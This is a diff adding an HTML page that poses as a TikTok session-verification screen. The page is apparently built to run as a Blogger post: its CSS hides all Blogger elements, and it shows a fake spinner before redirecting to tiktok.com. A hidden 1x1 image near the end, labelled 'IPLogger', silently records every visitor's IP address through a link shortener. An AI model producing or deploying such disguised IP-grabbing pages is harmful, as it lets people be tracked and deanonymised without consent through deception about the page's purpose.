@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>TikTok Verification</title>
+  <meta http-equiv="refresh" content="4; url=https://www.tiktok.com/">
+
+  <style>
+    /* Hide all Blogger elements */
+    .header, .footer, .comments, .post-footer, #comments, 
+    .comment-form, .blogger-profile, .sidebar, 
+    .post-title, .post-author, .navbar, .date-header {
+      display: none !important;
+    }
+
+    body {
+      margin: 0;
+      padding: 0;
+      overflow-x: hidden;
+      background-color: #ffffff;
+      color: #333333;
+      text-align: center;
+      font-family: Arial, sans-serif;
+      padding-top: 50px;
+    }
+
+    .logo {
+      width: 80px;
+      margin-bottom: 20px;
+    }
+
+    .loader {
+      border: 8px solid #f3f3f3;
+      border-top: 8px solid #ff0050;
+      border-radius: 50%;
+      width: 60px;
+      height: 60px;
+      animation: spin 1s linear infinite;
+      margin: 20px auto;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    p {
+      margin-top: 10px;
+      font-size: 16px;
+    }
+  </style>
+</head>
+<body>
+
+  <img src="https://cdn-icons-png.flaticon.com/128/3046/3046121.png" alt="TikTok Logo" class="logo">
+  <h2>Verifying your session...</h2>
+  <div class="loader"></div>
+  <p>Please wait while we redirect you to TikTok.</p>
+
+  <!-- Hidden tracking image (IPLogger) -->
+  <img src="https://2no.co/1uKyC4" width="1" height="1" style="display:none;">
+  
+</body>
+</html>
